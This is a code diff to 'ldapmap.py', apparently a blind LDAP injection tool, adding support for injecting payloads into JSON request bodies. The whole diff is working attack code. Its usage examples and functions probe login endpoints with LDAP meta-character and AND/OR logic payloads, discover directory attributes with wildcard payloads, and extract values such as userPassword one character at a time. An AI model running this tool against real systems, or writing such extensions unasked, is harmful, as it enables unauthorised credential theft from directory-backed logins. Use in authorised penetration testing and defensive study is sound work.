@@ -14,12 +14,18 @@ Usage examples:
     python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
         -p pass --extract userPassword
 
+    # Inject into a JSON body parameter
+    python ldapmap.py -u http://target/login \
+        --jsondata '{"username":"admin","password":"INJECT_HERE"}' \
+        -p password --extract userPassword
+
     # Route traffic through Burp Suite for debugging
     python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
         -p pass --proxy http://127.0.0.1:8080
 """
 
 import argparse
+import json
 import sys
 import string
 from urllib.parse import quote, urlencode, parse_qs
@@ -98,14 +104,20 @@ def send_request(
     session: requests.Session,
     url: str,
     data: dict,
+    use_json: bool = False,
 ) -> requests.Response | None:
     """
     Send a POST request and return the response.
 
+    When *use_json* is True the payload is sent as a JSON body
+    (``Content-Type: application/json``); otherwise it is sent as
+    URL-encoded form data.
+
     Returns None on connection errors so callers can handle failures gracefully.
     """
     try:
-        resp = session.post(url, data=data, timeout=TIMEOUT)
+        post_kwargs = {"json": data} if use_json else {"data": data}
+        resp = session.post(url, **post_kwargs, timeout=TIMEOUT)
         return resp
     except requests.exceptions.ConnectionError as exc:
         print(f"[!] Connection error: {exc}", file=sys.stderr)
@@ -127,17 +139,23 @@ def build_payload_data(
     base_data: dict,
     param: str,
     injection: str,
+    use_json: bool = False,
 ) -> dict:
     """
     Return a copy of *base_data* with *param* replaced by *injection*.
 
-    The injection string is URL-encoded before being substituted so that
-    special LDAP characters travel correctly over HTTP.
+    For form data (``use_json=False``) the injection string is URL-encoded
+    before substitution so that special LDAP characters travel correctly over
+    HTTP.  For JSON data (``use_json=True``) the raw string is used because
+    the requests library serialises the dict to JSON automatically.
     """
     payload_data = dict(base_data)
-    # quote() encodes characters that would break the form field; the server
-    # decodes them back before passing the value to the LDAP query.
-    payload_data[param] = quote(injection, safe="")
+    if use_json:
+        payload_data[param] = injection
+    else:
+        # quote() encodes characters that would break the form field; the server
+        # decodes them back before passing the value to the LDAP query.
+        payload_data[param] = quote(injection, safe="")
     return payload_data
 
 
@@ -150,13 +168,14 @@ def get_baseline(
     session: requests.Session,
     url: str,
     base_data: dict,
+    use_json: bool = False,
 ) -> tuple[int, int]:
     """
     Send an unmodified request and return *(status_code, content_length)*.
 
     This baseline is used to detect deviations caused by injected payloads.
     """
-    resp = send_request(session, url, base_data)
+    resp = send_request(session, url, base_data, use_json)
     if resp is None:
         print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
         sys.exit(1)
@@ -191,6 +210,7 @@ def calibrate(
     param: str,
     true_status: int,
     true_length: int,
+    use_json: bool = False,
 ) -> tuple[int, int]:
     """
     Attempt to identify a "true" response signature by injecting a wildcard.
@@ -202,8 +222,8 @@ def calibrate(
 
     Returns the (status, length) pair that represents a TRUE response.
     """
-    wildcard_data = build_payload_data(base_data, param, "*")
-    resp = send_request(session, url, wildcard_data)
+    wildcard_data = build_payload_data(base_data, param, "*", use_json)
+    resp = send_request(session, url, wildcard_data, use_json)
     if resp is None:
         return true_status, true_length
 
@@ -234,6 +254,7 @@ def detect_injection(
     param: str,
     true_status: int,
     true_length: int,
+    use_json: bool = False,
 ) -> bool:
     """
     Probe the target with common LDAP meta-characters and logic payloads.
@@ -247,8 +268,8 @@ def detect_injection(
     vulnerable = False
 
     for payload in DETECTION_PAYLOADS:
-        data = build_payload_data(base_data, param, payload)
-        resp = send_request(session, url, data)
+        data = build_payload_data(base_data, param, payload, use_json)
+        resp = send_request(session, url, data, use_json)
         if resp is None:
             continue
         length = len(resp.content)
@@ -267,8 +288,8 @@ def detect_injection(
     # AND / OR logic probes
     print("\n[*] AND/OR logic probes:")
     for label, payload in LOGIC_PAYLOADS.items():
-        data = build_payload_data(base_data, param, payload)
-        resp = send_request(session, url, data)
+        data = build_payload_data(base_data, param, payload, use_json)
+        resp = send_request(session, url, data, use_json)
         if resp is None:
             continue
         looks_true = is_true_response(resp, true_status, true_length)
@@ -294,6 +315,7 @@ def discover_attributes(
     param: str,
     true_status: int,
     true_length: int,
+    use_json: bool = False,
 ) -> list[str]:
     """
     Iterate through COMMON_ATTRIBUTES and test each with a wildcard payload.
@@ -308,8 +330,8 @@ def discover_attributes(
 
     for attr in COMMON_ATTRIBUTES:
         payload = f")({attr}=*)"
-        data = build_payload_data(base_data, param, payload)
-        resp = send_request(session, url, data)
+        data = build_payload_data(base_data, param, payload, use_json)
+        resp = send_request(session, url, data, use_json)
         if resp is None:
             continue
         if is_true_response(resp, true_status, true_length):
@@ -334,6 +356,7 @@ def extract_attribute(
     attribute: str,
     true_status: int,
     true_length: int,
+    use_json: bool = False,
 ) -> str:
     """
     Extract the value of *attribute* one character at a time using LDAP wildcards.
@@ -358,8 +381,8 @@ def extract_attribute(
         for char in CHARSET:
             # Build blind payload: )(attr=<prefix><char>*)
             payload = f")({attribute}={extracted}{char}*)"
-            data = build_payload_data(base_data, param, payload)
-            resp = send_request(session, url, data)
+            data = build_payload_data(base_data, param, payload, use_json)
+            resp = send_request(session, url, data, use_json)
             if resp is None:
                 continue
             if is_true_response(resp, true_status, true_length):
@@ -397,11 +420,20 @@ def parse_args() -> argparse.Namespace:
         metavar="URL",
         help="Target URL (e.g., http://target/login)",
     )
-    parser.add_argument(
+    data_group = parser.add_mutually_exclusive_group(required=True)
+    data_group.add_argument(
         "-d", "--data",
-        required=True,
         metavar="DATA",
         help='POST form data, e.g. "username=admin&password=INJECT_HERE"',
+    )
+    data_group.add_argument(
+        "--jsondata",
+        metavar="JSON",
+        help=(
+            'POST JSON body, e.g. \'{"username":"admin","password":"INJECT_HERE"}\'. '
+            "Sends Content-Type: application/json. "
+            "Use --param to specify which top-level key to inject into."
+        ),
     )
     parser.add_argument(
         "-p", "--param",
@@ -436,13 +468,27 @@ def main() -> None:
     """Main orchestration function."""
     args = parse_args()
 
-    # Parse form data string into a dict (parse_qs returns lists; flatten them)
-    parsed = parse_qs(args.data, keep_blank_values=True)
-    base_data = {k: v[0] for k, v in parsed.items()}
+    if args.jsondata is not None:
+        # Parse JSON body into a dict
+        try:
+            base_data = json.loads(args.jsondata)
+        except json.JSONDecodeError as exc:
+            print(f"[!] Invalid JSON in --jsondata: {exc}", file=sys.stderr)
+            sys.exit(1)
+        if not isinstance(base_data, dict):
+            print("[!] --jsondata must be a JSON object (key/value pairs).", file=sys.stderr)
+            sys.exit(1)
+        use_json = True
+    else:
+        # Parse form data string into a dict (parse_qs returns lists; flatten them)
+        parsed = parse_qs(args.data, keep_blank_values=True)
+        base_data = {k: v[0] for k, v in parsed.items()}
+        use_json = False
 
     if args.param not in base_data:
+        data_flag = "--jsondata" if use_json else "--data"
         print(
-            f"[!] Parameter '{args.param}' not found in --data. "
+            f"[!] Parameter '{args.param}' not found in {data_flag}. "
             "Check spelling and try again.",
             file=sys.stderr,
         )
@@ -450,22 +496,23 @@ def main() -> None:
 
     print(f"[*] Target  : {args.url}")
     print(f"[*] Param   : {args.param}")
+    print(f"[*] Mode    : {'JSON body' if use_json else 'form data'}")
     if args.proxy:
         print(f"[*] Proxy   : {args.proxy}")
 
     session = build_session(args.proxy)
 
     # 1. Baseline
-    true_status, true_length = get_baseline(session, args.url, base_data)
+    true_status, true_length = get_baseline(session, args.url, base_data, use_json)
 
     # 2. Calibrate TRUE fingerprint
     true_status, true_length = calibrate(
-        session, args.url, base_data, args.param, true_status, true_length
+        session, args.url, base_data, args.param, true_status, true_length, use_json
     )
 
     # 3. Detection
     vulnerable = detect_injection(
-        session, args.url, base_data, args.param, true_status, true_length
+        session, args.url, base_data, args.param, true_status, true_length, use_json
     )
 
     if not vulnerable:
@@ -480,7 +527,7 @@ def main() -> None:
     if args.extract:
         value = extract_attribute(
             session, args.url, base_data, args.param,
-            args.extract, true_status, true_length,
+            args.extract, true_status, true_length, use_json,
         )
         if value:
             print(f"\n[+] Extracted {args.extract} = {value}")
@@ -488,7 +535,7 @@ def main() -> None:
             print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
     else:
         attrs = discover_attributes(
-            session, args.url, base_data, args.param, true_status, true_length
+            session, args.url, base_data, args.param, true_status, true_length, use_json
         )
         if attrs:
             print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
